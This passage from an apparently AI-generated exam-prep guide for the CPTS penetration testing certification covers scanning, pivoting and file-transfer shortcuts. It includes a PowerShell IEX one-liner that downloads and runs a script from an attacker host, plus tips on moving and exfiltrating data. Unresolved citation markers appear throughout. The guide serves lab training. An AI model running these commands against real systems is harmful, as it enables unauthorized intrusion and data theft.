Implement monitoring for use of domain admin credentials on unusual machines (so if an admin logs into a workstation and we dump creds, someone knows).
Limit delegation and service account privileges (principle of least privilege).
Implement endpoint protections that would detect Mimikatz or other tools (if none stopped you).
Train and deploy DLP to prevent easy exfiltration.
The goal in CPTS reporting is to show you didn’t just grab flags, you assessed the security posture. Doing these post-DA steps shows you think like an attacker and a consultant providing actionable insights. It’s the difference between a barebones “I owned you” report and a stellar “Here’s how to improve” report.
Time-Saving Mini Tactics and Quick Wins
Finally, here are some bite-sized tactics and tips that can save you time during the exam, especially when dealing with networking, pivoting, and miscellaneous tasks:
Nmap Efficiency: Use the right scan at the right time. For initial broad port scanning on a /24, nmap -T4 -p- --min-rate=1000 --min-hostgroup=100 <targets> can find open ports quickly (adjust rate as needed). Follow up with service detection only on found ports (-sC -sV -p <list>). To scan through a pivot (proxychains or SOCKS), prefer full TCP connect scans (-sT) as SYN scans might not work over proxy. If you have a list of targets, use -iL targets.txt to feed nmap, and --exclude to skip known offline hosts to save time. Also remember RustScan as an alternative – super fast port discovery, then hand off to Nmap. In short: don’t wait for default scans if you can optimize. A well-known quick win: scanning common ports first (like -F for top 100, or a custom top 1000 list weighted towards SMB, HTTP, RDP) – this might reveal entry points faster than doing full 65k on every host sequentially. In a timeboxed engagement, finding one open RDP with weak creds in 5 minutes beats finding it after 5 hours of exhaustive scanning.
Evil-WinRM & File Transfer Tricks: We touched on Evil-WinRM upload/download. One neat trick: Evil-WinRM’s upload can take a directory (it will zip and transfer). Use this to quickly drop whole toolsets (like a folder of scripts) onto a target without setting up SMB shares. Another trick: if you have two shells on the same Windows host (perhaps two different accounts), you can use -S (SSL) to encrypt Evil-WinRM traffic if you suspect someone might be monitoring (usually not in exam, but just in case). For large data exfiltration in Windows, BITS is your friend: from a Win shell, Start-BitsTransfer -Source \\ATTACKER\share\bigfile.zip -Destination C:\Users\Public\bigfile.zip is often faster and more reliable than copying via SMB mounting. Also, don’t forget the simple powershell -c Invoke-WebRequest to pull files from your box – if you lack a fancy tool, a one-liner can replace upload: e.g. powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOURIP:8000/SharpHound.ps1')" to execute a script directly from your machine.
Proxychains and Pivoting Shortcuts: Using proxychains with every tool can be tedious. Where possible, configure tools to use a proxy natively:
For example, Responder or CrackMapExec might not support socks proxies, but CME does support proxychains as long as you use proxychains properly. If a tool ignores proxychains (some do, as noted【18†L1059-L1066】), consider alternatives: run those tools directly on the pivot (if it’s a Linux pivot, you can SSH in and run nmap there, etc.).
Use SSH dynamic forwarding (SOCKS): ssh -D 9050 -C user@pivot creates a SOCKS proxy; combine with ProxyCommand or ProxyJump in SSH config to chain pivots. If double pivoting (two hops), instead of nested proxychains, do an SSH proxy jump: ssh -J pivot1user@pivot1 pivot2user@pivot2 can sometimes simplify two hops (though for scanning, a proper socks chain as discussed in pivot section is needed).
A quick diagram or mental model helps: Each pivot = new network scope. After pivoting, re-run recon from that context【18†L1038-L1046】 – don’t forget this! Many people pivot but then still try scanning with their local nmap (which may not see new subnets unless properly tunneled). Checklist: update /etc/hosts or resolver to handle internal DNS if needed (the Medium tip about DNS resolution inside tunnels is golden【18†L1057-L1061】).
If dealing with Linux pivots, consider chisel in reverse mode: run chisel server on your attack box, and client on pivot connecting back – easier for when pivot is behind NAT and you already have shell there. It spares you from complex SSH setups.
One more: SSH port forwards for specific services – e.g., ssh -L 3389:targethost:3389 user@pivot to forward RDP port through pivot for a single host. This way you can RDP using localhost:3389 on your machine to reach the target (useful if you compromised a jump box and want to RDP to an internal server from your host).
SSH Double Pivot Diagram: (Refer to the image above for a visual on multi-hop SOCKS). The concept is: attacker -> jumpbox1 -> jumpbox2 -> final target network【38†L65-L73】【38†L79-L88】. Use local SOCKS at each hop and chain them in proxychains config【38†L95-L103】【38†L107-L111】. It’s complex, but writing down the steps (as in the image) helps ensure you don’t misconfigure. If a double pivot is needed in the exam, don’t shy from spending 30 minutes setting up a stable chain – it pays off by opening the next layer of the network. And document it for the report (clients love to see a diagram of how an attacker tunneled through their network) – it drives home the point about segmentation flaws.
One-Liners and Aliases: Little shortcuts can accumulate big time savings:
Have a bashrc or script with your common aliases: e.g., alias ll='ls -la', alias ports='netstat -tulnp | grep LISTEN' when on Linux hosts, etc. It saves keystrokes.
Use history search (Ctrl+R) frequently to avoid retyping long commands.
In PowerShell, use Invoke-History or up-arrow to reuse commands, and know that | clip pipes output to Windows clipboard (if you have GUI access via RDP, that’s handy to transfer data out via copy-paste).
A quick win on Windows shells: doskey /history shows your current session command history – good for double-checking what you ran if you lose a session unexpectedly.
Create quick and dirty scripts: e.g., a tiny shell script to automatically enumerate interesting things (combine ideas from LinPEAS into a 10-line script focusing on likely exam vulns). Running that after getting a shell can dump a bunch of info while you work on something else.
Network Visualization: If dealing with many subnets, a simple trick: use echo to map them. E.g., maintain a text file of discovered subnets and devices. If you find route from one network to another, note it. In the heat of an exam, it’s easy to forget which IP belongs where. Writing a mini network table saves confusion (like “10.10.10.0/24 – main domain, 10.10.20.0/24 – DMZ servers, 172.16.5.0/24 – secret subnet accessible from host X”). This also translates to a nice diagram later.
Documentation as you go: It’s a time-saving tactic often overlooked: taking a screenshot or note during exploitation means you won’t have to recreate it later. When you get DA, quickly screenshot the proof (whoami on DC, etc.). When you find a critical file, screenshot its content. This way, when writing the report you have all evidence ready and don’t need to re-gather, which can be impossible if the exam lab is taken down. It’s not directly related to hacking, but it will save you time and stress after exploitation is done.
Using these mini tactics, an experienced pentester can shave hours off the total engagement time. CPTS is as much a test of endurance and organization as of pure hacking skill, so every efficiency counts. Adopt these shortcuts in practice so by exam time it’s second nature to, say, spin up an SSH tunnel or launch ffuf with the right options. The more fluid your workflow, the more focus you can devote to analysis and creativity rather than environment wrangling.
By following the guidance above – from leveraging automation and community tools, to mastering manual techniques, to organizing your notes and applying smart shortcuts – you will be well-equipped to excel in the CPTS exam. This comprehensive approach not only helps in capturing all the flags but also in delivering a professional report that highlights the full impact of your findings and provides clear value to the “client” (even if in the exam scenario the client is fictional). Good luck, and remember: methodology and preparedness are your best weapons. With the right preparation (and this vault of tips at your fingertips), you’ll be ready to tackle whatever challenges the CPTS environment throws at you【35†L187-L195】【35†L194-L200】.
